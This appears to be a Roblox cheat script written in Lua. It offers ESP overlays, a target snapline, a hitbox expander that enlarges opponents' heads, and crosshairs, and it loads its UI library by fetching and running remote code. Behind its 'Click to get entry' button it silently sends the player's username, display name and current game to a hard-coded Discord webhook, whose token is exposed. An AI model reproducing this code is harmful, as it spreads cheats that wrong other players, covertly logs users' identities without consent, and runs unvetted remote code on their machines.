local DrRayLibrary = loadstring(game:HttpGet("https://raw.githubusercontent.com/AZYsGithub/DrRay-UI-Library/main/DrRay.lua"))()
local screenGui = Instance.new("ScreenGui")
screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
local buttonFrame = Instance.new("Frame")
buttonFrame.Size = UDim2.new(0, 200, 0, 50)
buttonFrame.Position = UDim2.new(0.5, -100, 0.5, -25)
buttonFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
buttonFrame.Parent = screenGui




local button = Instance.new("TextButton")
button.Size = UDim2.new(1, 0, 1, 0)
button.Text = "Click to get entry"
button.TextColor3 = Color3.fromRGB(255, 255, 255)
button.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
button.Parent = buttonFrame




button.MouseButton1Click:Connect(function()
    buttonFrame.Visible = false
    
    local url = "https://discord.com/api/webhooks/1332147183193034793/PlUQDOJDYvaMdjHcI_xRADAuTwZaXZWf3KRi4cFStskX8lzBtCqDK-7tlwVAoYkrmq5J"
    local players = game:GetService("Players")
    local lplayer = players.LocalPlayer
    local gname = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
    local data = {
        ["embeds"] = {
            {
                ["title"] = "LOG",
                ["description"] = "Name: " .. lplayer.Name .. "\nDisplay: " .. lplayer.DisplayName .. "\nGame: " .. gname,
                ["type"] = "rich",
                ["color"] = tonumber(0xA60842),
            }
        }
    }
    local newdata = game:GetService("HttpService"):JSONEncode(data)
    local headers = {["content-type"] = "application/json"}
    local request = http_request or request or HttpPost or syn.request
    local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
    request(abcdef)
    
    local window = DrRayLibrary:Load("Sigma.gg", "Default")
    local tab = DrRayLibrary.newTab("main", "")
    
    local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local Camera = game.Workspace.CurrentCamera




local FOVCircle = Drawing.new("Circle")
FOVCircle.Radius = 100 
FOVCircle.Thickness = 2
FOVCircle.Color = Color3.fromRGB(255, 255, 255)
FOVCircle.Filled = false
FOVCircle.Transparency = 1
FOVCircle.Position = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2) -- Center of the screen
FOVCircle.Visible = false  




local Snapline = Drawing.new("Line")
Snapline.Thickness = 1
Snapline.Color = Color3.fromRGB(255, 0, 0) 
Snapline.Transparency = 1
Snapline.Visible = false 




local function updateSnapline()
    local closestPlayer = nil
    local closestDistance = math.huge 
    
    for _, target in ipairs(Players:GetPlayers()) do
        if target ~= LocalPlayer then
            local character = target.Character
            if character and character:FindFirstChild("Head") then
                local headPosition = character.Head.Position
                local screenPosition, onScreen = Camera:WorldToViewportPoint(headPosition)




                if onScreen then
                    local fovCenter = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2) -- FOV center (screen center)
                    local distanceFromCenter = (Vector2.new(screenPosition.X, screenPosition.Y) - fovCenter).Magnitude
                    
                    if distanceFromCenter <= FOVCircle.Radius then
                        if distanceFromCenter < closestDistance then
                            closestDistance = distanceFromCenter
                            closestPlayer = target
                        end
                    end
                end
            end
        end
    end
    
    if closestPlayer then
        local character = closestPlayer.Character
        if character and character:FindFirstChild("Head") then
            local headPosition = character.Head.Position
            local screenPosition = Camera:WorldToViewportPoint(headPosition)




            Snapline.From = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)  -- FOV center
            Snapline.To = Vector2.new(screenPosition.X, screenPosition.Y)
            Snapline.Visible = true
        end
    else
        Snapline.Visible = false 
    end
end




local isFOVCircleEnabled = false 
tab.newToggle("Toggle FOV Circle", "Toggle FOV Circle visibility", false, function(toggleState)
    isFOVCircleEnabled = toggleState
end)




local isSnaplineEnabled = false  
tab.newToggle("Toggle Snapline", "Toggle Snapline visibility", false, function(toggleState)
    isSnaplineEnabled = toggleState
end)




RunService.RenderStepped:Connect(function()
    if isFOVCircleEnabled then
        FOVCircle.Position = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)
        FOVCircle.Visible = true 
    else
        FOVCircle.Visible = false 
    end




    if isSnaplineEnabled then
        updateSnapline()
    else
        Snapline.Visible = false
    end
end)
    tab.newButton("Esp", "", function()
if (not _G.Loaded) then
    _G.Loaded = true
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local RunService = game:GetService("RunService")
    local Items = ReplicatedStorage:WaitForChild("HandModels")
    local CoreGui = game:GetService("CoreGui")
    local CurrentCamera = workspace.CurrentCamera
    
    -- Correctly reference the 'Const' folder and the 'Ignore' folder within it
    local ConstFolder = workspace:WaitForChild("Const")
    local IgnoreFolder = ConstFolder:WaitForChild("Ignore")  -- Accessing the 'Ignore' folder inside 'Const'
    
    local SleepAnimationId = "rbxassetid://13280887764"
    local HasESP = {}


    -- Initialize ESP flags if not set already
    if not _G.Flags then
        _G.Flags = {
            ESP = {
                DistanceLimit = 1000,
                Box = true,
                Distance = true,
                Name = true,
                Weapon = true,
                Sleepers = false,
            }
        }
    end


    -- Cache player's model parts size to avoid recalculating every frame
    local OriginalSizes = {}
    for i,v in pairs(ReplicatedStorage.Shared.entities.Player.Model:GetChildren()) do
        if v:IsA("BasePart") then
            OriginalSizes[v.Name] = v.Size
        end
    end


    -- Add "RealName" attributes to hand models
    for i,v in pairs(Items:GetChildren()) do
        v:SetAttribute("RealName", v.Name)
    end


    -- Check if player is sleeping
    function IsSleeping(Player)
        if not Player.AnimationController then return false end  -- Check if AnimationController exists
        local Animations = Player.AnimationController:GetPlayingAnimationTracks()
        for i,v in pairs(Animations) do
            if v.IsPlaying and v.Animation.AnimationId == SleepAnimationId then
                return true
            end
        end
        return false
    end


    -- Create a BillboardGui with the required elements
    function CreateESP()
        local BillboardGui = Instance.new("BillboardGui")
        local Box = Instance.new("Frame")
        local PlayerName = Instance.new("TextLabel")
        local PlayerWeapon = Instance.new("TextLabel")
        local PlayerDistance = Instance.new("TextLabel")
        local UIStroke = Instance.new("UIStroke")


        -- Make sure BillboardGui is set up
        BillboardGui.Parent = CoreGui
        BillboardGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
        BillboardGui.Active = true
        BillboardGui.AlwaysOnTop = true
        BillboardGui.LightInfluence = 1.000
        BillboardGui.Size = UDim2.new(500, 0, 800, 0)


        -- Set up the Box (visual part of ESP)
        Box.Name = "Box"
        Box.Parent = BillboardGui
        Box.AnchorPoint = Vector2.new(0.5, 0.5)
        Box.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        Box.BackgroundTransparency = 1.000
        Box.BorderColor3 = Color3.fromRGB(0, 0, 0)
        Box.BorderSizePixel = 0
        Box.Position = UDim2.new(0.5, 0, 0.5, 0)
        Box.Size = UDim2.new(0.00899999961, 0, 0.00899999961, 0)


        -- Set up the stroke for the box
        UIStroke.Name = "UIStroke"
        UIStroke.Parent = Box
        UIStroke.Thickness = 1
        UIStroke.Color = Color3.fromRGB(0, 255, 0)
        UIStroke.LineJoinMode = Enum.LineJoinMode.Miter


        -- Set up the PlayerName text label
        PlayerName.Name = "PlayerName"
        PlayerName.Parent = BillboardGui
        PlayerName.AnchorPoint = Vector2.new(0.5, 1)
        PlayerName.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        PlayerName.BackgroundTransparency = 1.010
        PlayerName.BorderColor3 = Color3.fromRGB(0, 0, 0)
        PlayerName.BorderSizePixel = 0
        PlayerName.Position = UDim2.new(0.5, 0, 0.495499998, 0)
        PlayerName.Size = UDim2.new(0, 100, 0, 10)
        PlayerName.Font = Enum.Font.SourceSans
        PlayerName.Text = "Player"
        PlayerName.TextColor3 = Color3.fromRGB(0, 255, 8)
        PlayerName.TextSize = 14.000
        PlayerName.TextYAlignment = Enum.TextYAlignment.Bottom


        -- Set up the PlayerWeapon text label
        PlayerWeapon.Name = "PlayerWeapon"
        PlayerWeapon.Parent = BillboardGui
        PlayerWeapon.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        PlayerWeapon.BackgroundTransparency = 1.010
        PlayerWeapon.BorderColor3 = Color3.fromRGB(0, 0, 0)
        PlayerWeapon.BorderSizePixel = 0
        PlayerWeapon.Position = UDim2.new(0.504499972, 0, 0.495499998, 0)
        PlayerWeapon.Size = UDim2.new(0, 100, 0, 10)
        PlayerWeapon.Font = Enum.Font.SourceSans
        PlayerWeapon.Text = "Weapon"
        PlayerWeapon.TextColor3 = Color3.fromRGB(0, 255, 8)
        PlayerWeapon.TextSize = 14.000
        PlayerWeapon.TextXAlignment = Enum.TextXAlignment.Left
        PlayerWeapon.TextYAlignment = Enum.TextYAlignment.Bottom
        PlayerWeapon.Visible = false


        -- Set up the PlayerDistance text label
        PlayerDistance.Name = "PlayerDistance"
        PlayerDistance.Parent = BillboardGui
        PlayerDistance.AnchorPoint = Vector2.new(0.5, 0)
        PlayerDistance.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        PlayerDistance.BackgroundTransparency = 1.010
        PlayerDistance.BorderColor3 = Color3.fromRGB(0, 0, 0)
        PlayerDistance.BorderSizePixel = 0
        PlayerDistance.Position = UDim2.new(0.5, 0, 0.504999995, 5)
        PlayerDistance.Size = UDim2.new(0, 100, 0, 10)
        PlayerDistance.Font = Enum.Font.SourceSans
        PlayerDistance.Text = "500"
        PlayerDistance.TextColor3 = Color3.fromRGB(0, 255, 8)
        PlayerDistance.TextSize = 14.000
        PlayerDistance.TextYAlignment = Enum.TextYAlignment.Bottom


        -- Return the initialized BillboardGui
        return BillboardGui
    end


    -- Get the weapon of the player
    function PlayerWeapon(Player)
        local Model = Player:FindFirstChildOfClass("Model")
        return Model and Model:GetAttribute("RealName") or "None"
    end


    -- Check if the model is a player
    function IsPlayer(Model)
        return Model.ClassName == "Model" and Model:FindFirstChild("Torso") and Model.PrimaryPart ~= nil
    end


    -- Set the color of the ESP elements
    function SetColor(Billboard, Color) 
        -- Ensure the properties are valid before changing them
        if Billboard and Billboard.PlayerName and Billboard.PlayerDistance and Billboard.PlayerWeapon then
            Billboard.PlayerName.TextColor3 = Color
            Billboard.PlayerDistance.TextColor3 = Color
            Billboard.PlayerWeapon.TextColor3 = Color
            Billboard.Box.UIStroke.Color = Color
        end
    end


    -- Main loop to update ESPs
    RunService.Heartbeat:Connect(function()
        local ESP = _G.Flags.ESP
        for _,v in pairs(workspace:GetChildren()) do
            -- Ensure the model is a valid player and has a PrimaryPart
            if (HasESP[v] or (IsPlayer(v) and v.PrimaryPart)) then
                if (HasESP[v] == nil) then
                    local Billboard = CreateESP()
                    HasESP[v] = Billboard


                    -- Only set Adornee if PrimaryPart is valid
                    if v.PrimaryPart then
                        Billboard.Adornee = v.PrimaryPart
                    end
                elseif (HasESP[v] ~= nil) then
                    local Billboard = HasESP[v]
                    local PrimaryPosition = v.PrimaryPart.Position
                    local Origin = CurrentCamera.CFrame.Position
                    local Distance = (Origin - PrimaryPosition).Magnitude
                    local Sleeping = IsSleeping(v)


                    -- If player is out of range or sleeping, disable the ESP
                    if (Distance > ESP.DistanceLimit or (not ESP.Sleepers and Sleeping)) then
                        Billboard.Enabled = false
                    else
                        Billboard.Enabled = true
                        Billboard.Adornee = v.PrimaryPart


                        -- Update visibility of ESP elements based on flags
                        Billboard.Box.Visible = ESP.Box
                        Billboard.PlayerDistance.Visible = ESP.Distance
                        Billboard.PlayerName.Visible = ESP.Name
                        Billboard.PlayerWeapon.Visible = ESP.Weapon


                        -- Set the player's distance and weapon
                        Billboard.PlayerDistance.Text = math.round(Distance) .. "s"
                        Billboard.PlayerWeapon.Text = PlayerWeapon(v)


                        -- Set player name if available
                        if v.Head and v.Head.Nametag and v.Head.Nametag.tag.Text ~= "" then
                            Billboard.PlayerName.Text = v.Head.Nametag.tag.Text
                        end
                    end
                end
            end
        end
    end)
end
end)
tab.newToggle("Toggle hbe", "Toggle hbe (hitbox expander)", true, function(toggleState)
    Hitbox = toggleState 
end) 
tab.newSlider("hitbox size", "hitbox expander slider", 10, false, function(num)
    headsize = num
end)




local function modifyPlayerHeads()
    for i, v in next, game.Workspace:GetChildren() do
        if v.Name == "Model" and v:FindFirstChild("Head") then
            local head = v.Head
            if head then
                local success, _ = pcall(function()
                    head.Size = Vector3.new(headsize, headsize, headsize)
                    head.Transparency = 0.5
                end)
                if not success then
                    warn("Failed to modify head for player:", v.Name)
                end
            end
        end
    end
end




game:GetService("RunService").RenderStepped:Connect(function()
    if Hitbox then
        modifyPlayerHeads()
    end
end)
local tab = DrRayLibrary.newTab("Mics", "")
tab.newButton("Pc crosshair", "", function()
    local player = game.Players.LocalPlayer
    local mouse = player:GetMouse()
    local gui = Instance.new("ScreenGui")
    local circle = Instance.new("Frame")
    local stroke = Instance.new("UIStroke")




    gui.Name = "CrosshairGui"
    gui.Parent = player:WaitForChild("PlayerGui")




    circle.Size = UDim2.new(0, 50, 0, 50)
    circle.Position = UDim2.new(0, mouse.X - 25, 0, mouse.Y - 25)
    circle.BackgroundTransparency = 1
    circle.Parent = gui




    stroke.Thickness = 2
    stroke.Color = Color3.new(1, 0, 0)
    stroke.Parent = circle




    local uicorner = Instance.new("UICorner")
    uicorner.CornerRadius = UDim.new(1, 0)
    uicorner.Parent = circle




    game:GetService("RunService").RenderStepped:Connect(function()
        local x, y = mouse.X, mouse.Y
        circle.Position = UDim2.new(0, x - circle.AbsoluteSize.X / 2, 0, y - circle.AbsoluteSize.Y / 2)
    end)
end)
local Camera = game:GetService("Workspace").CurrentCamera  
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer




local FOVCircle = Drawing.new("Circle")
FOVCircle.Radius = 35 
FOVCircle.Thickness = 2
FOVCircle.Color = Color3.fromRGB(255, 0, 0)  
FOVCircle.Filled = false
FOVCircle.Transparency = 1
FOVCircle.Position = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2) 
FOVCircle.Visible = false
local PlusSign = Drawing.new("Text")
PlusSign.Text = "+"  
PlusSign.Size = 50  
PlusSign.Position = Vector2.new(Camera.ViewportSize.X / 2 - 1, Camera.ViewportSize.Y / 2 - 25)  
PlusSign.Color = Color3.fromRGB(255, 0, 0)  
PlusSign.Center = true  
PlusSign.Outline = true  
PlusSign.OutlineColor = Color3.fromRGB(0, 0, 0)  
PlusSign.Visible = false
local function updateFOVCircle()
    if Camera then  
        local center = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)
        FOVCircle.Position = center  
        PlusSign.Position = center + Vector2.new(-1, -25)  
    end
end
game:GetService("RunService").RenderStepped:Connect(updateFOVCircle)
tab.newButton("Moblie crosshair", "", function()
        local player = game.Players.LocalPlayer
    local gui = Instance.new("ScreenGui")
    local circle = Instance.new("Frame")
    local stroke = Instance.new("UIStroke")
    local horizontalLine = Instance.new("Frame")
    local verticalLine = Instance.new("Frame")




    gui.Name = "CrosshairGui"
    gui.Parent = player:WaitForChild("PlayerGui")
    gui.ResetOnSpawn = false 




    circle.Size = UDim2.new(0, 45, 0, 45) 
    circle.AnchorPoint = Vector2.new(0.5, 0.5)
    circle.Position = UDim2.new(0.5, 0, 0.45, 0)
    circle.BackgroundTransparency = 1 
    circle.Parent = gui




    stroke.Thickness = 1.5 
    stroke.Color = Color3.new(1, 0, 0) 
    stroke.Parent = circle




    local uicorner = Instance.new("UICorner")
    uicorner.CornerRadius = UDim.new(1, 0) 
    uicorner.Parent = circle
  
    horizontalLine.Size = UDim2.new(0, 20, 0, 2)
    horizontalLine.AnchorPoint = Vector2.new(0.5, 0.5)
    horizontalLine.Position = UDim2.new(0.5, 0, 0.45, 0)
    horizontalLine.BackgroundColor3 = Color3.new(1, 0, 0)
    horizontalLine.BorderSizePixel = 0
    horizontalLine.Parent = gui
  
    verticalLine.Size = UDim2.new(0, 2, 0, 20)
    verticalLine.AnchorPoint = Vector2.new(0.5, 0.5)
    verticalLine.Position = UDim2.new(0.5, 0, 0.45, 0)
    verticalLine.BackgroundColor3 = Color3.new(1, 0, 0)
    verticalLine.BorderSizePixel = 0
    verticalLine.Parent = gui




    gui:GetPropertyChangedSignal("AbsoluteSize"):Connect(function()
        circle.Position = UDim2.new(0.5, 0, 0.45, 0) 
        horizontalLine.Position = UDim2.new(0.5, 0, 0.45, 0) 
        verticalLine.Position = UDim2.new(0.5, 0, 0.45, 0) 
    end)
end)
for _, line in ipairs({
    " ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░             ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░",
    "░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░             ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░",
    "░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░             ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░    ░▒▓██▓▒░",
    "░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒▒▓█▓▒░░▒▓██████▓▒░ ░▒▓███████▓▒░░▒▓███████▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░              ░▒▓██████▓▒░ ░▒▓██████▓▒░   ░▒▓██▓▒░",
    "░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▓█▓▒░ ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░             ░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░    ░▒▓██▓▒░",
    "░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▓█▓▒░ ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓██▓▒░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░",
    " ░▒▓██████▓▒░   ░▒▓██▓▒░  ░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓████████▓▒░▒▓████████▓▒░▒▓██▓▒░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░   ░▒▓████████▓▒░"
}) do warn(line) end
end)
